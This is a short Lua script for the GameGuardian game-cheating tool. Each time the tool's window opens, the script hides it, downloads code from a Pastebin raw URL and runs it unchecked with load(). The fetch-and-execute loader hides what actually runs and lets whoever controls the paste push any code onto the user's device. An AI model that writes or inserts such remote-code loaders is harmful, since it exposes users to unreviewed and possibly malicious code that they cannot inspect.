function Oleg()
local script0 = gg.makeRequest("https://pastebin.com/raw/Ebxzz8Fh").content
pcall(load(script0))
end

while(true) do
menuend=0
if gg.isVisible(true) then
gg.setVisible(false)
menuend=1
end
if menuend==1 then Oleg() end
end